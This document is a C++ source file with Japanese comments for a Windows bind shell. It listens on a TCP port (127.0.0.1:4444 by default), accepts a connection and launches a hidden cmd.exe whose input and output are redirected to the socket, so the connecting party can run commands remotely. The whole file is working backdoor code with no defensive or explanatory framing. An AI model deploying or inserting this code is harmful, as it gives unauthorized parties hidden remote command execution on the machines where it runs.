#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <string>
#include <thread>
#include <chrono>

#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>

#pragma comment(lib, "ws2_32")

struct Arg {
    wchar_t ipAddress[255] = L"127.0.0.1";
    wchar_t portStr[255] = L"4444";
} arg;


// エントリポイント
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

    // ポート番号を文字列からDWORDに変換
    DWORD port = wcstoul(arg.portStr, nullptr, 10);

    // ソケットライブラリを初期化
    WSADATA socketData;
    WSAStartup(MAKEWORD(2, 2), &socketData);

    // ソケットオブジェクトを作成 (TCPソケット)
    SOCKET serverSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);

    // サーバーのアドレス設定 (IPアドレス、ポート番号)
    struct sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(port);
    InetPton(AF_INET, arg.ipAddress, &serverAddress.sin_addr);

    // バインド
    bind(serverSocket, reinterpret_cast<SOCKADDR*>(&serverAddress), sizeof(serverAddress));

    // 接続の待機
    listen(serverSocket, 5);

    // 接続が来るまで待機
    SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);
    if (clientSocket == INVALID_SOCKET) {
        return 1;
    }

    // プロセス構造体の初期化
    STARTUPINFO si = {};
    PROCESS_INFORMATION pi = {};

    // 入出力をソケットにリダイレクト
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = reinterpret_cast<HANDLE>(clientSocket);
    si.hStdOutput = reinterpret_cast<HANDLE>(clientSocket);
    si.hStdError = reinterpret_cast<HANDLE>(clientSocket);

    // リダイレクトされたストリームでシェルを起動
    wchar_t shell[255] = L"cmd.exe";
    CreateProcess(nullptr, shell, nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);

    // 終了を待機してリソースを解放
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(clientSocket);
    closesocket(serverSocket);

    return 0;
}
